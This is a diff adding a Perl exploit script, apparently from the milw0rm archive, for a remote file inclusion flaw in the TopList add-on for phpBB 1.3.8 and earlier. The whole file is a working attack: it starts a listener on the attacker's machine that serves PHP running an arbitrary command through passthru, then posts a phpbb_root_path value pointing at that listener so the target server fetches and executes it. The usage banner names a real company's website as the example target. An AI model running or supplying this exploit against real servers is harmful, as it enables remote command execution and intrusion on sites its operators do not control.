@@ -1,0 +1,63 @@
+# TopList Hack for PHPBB <= 1.3.8 Remote File Inclusion
+# Based on http://milw0rm.com/exploits/1722
+# Bug found by : [Oo]
+#
+# No more uploading php shells !!! 
+# This is my way of php include exploitation !!!
+# Learn to play with sockets !!!
+# FOX_MULDER (fox_mulder@abv.bg)
+
+#!/usr/bin/perl
+  use LWP 5.64;
+  use IO::Socket;
+  use LWP::Simple;
+
+(my $hostname, my $target, my $dir,my $command) = @ARGV;
+
+if(@ARGV < 4) {
+print "=======================================================================+\n";
+print "TopList REMOTE COMMAND EXECUTION EXPLOIT by fox_mulder\@abv.bg         |\n";
+print "Usage: top.pl yourIP target /dir/ \"command\"                            |\n";
+print "Example: top.pl 10.20.30.40 www.microsoft.com /forum/ \"uname -a\"     |\n";
+print "=======================================================================+\n";
+exit;
+}
+print "[+]Creating listening socket . . .\n";
+my $sock = new IO::Socket::INET (
+                                  LocalHost => "$hostname",
+                                  LocalPort => '9999',
+                                  Proto => 'tcp',
+                                  Listen => 1,
+                                  Reuse => 1,
+                                 );
+ die "Could not create socket: $!\n" unless $sock;
+
+        if (my $pid = fork){
+        my $new_sock = $sock->accept();
+                my $request = <$new_sock>;
+                print $new_sock "HTTP/1.1 200 OK\n";
+                print $new_sock "Content-Length: $content_length\n";
+                print $new_sock "Content-Type: text/plain\n\n";
+                print $new_sock "<? error_reporting(0);passthru(\"$command\"); ?>\n";
+                close $new_sock;
+                exit;
+        }
+print "[+]Injecting  command . . .\n";
+
+my $browser = LWP::UserAgent->new;
+   $browser->agent('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)');
+
+  my $url = "http://$target/$dir/toplist.php";
+  my $response = $browser->post( $url,
+    [
+	'f'            => "toplist_top10",
+        'phpbb_root_path' => "http://$hostname:9999/blah.php"
+]
+  );
+
+  die "Received invalid response type", $response->content_type
+   unless $response->content_type eq 'text/html';
+
+        print $response->content;
+
+# milw0rm.com [2006-04-28]
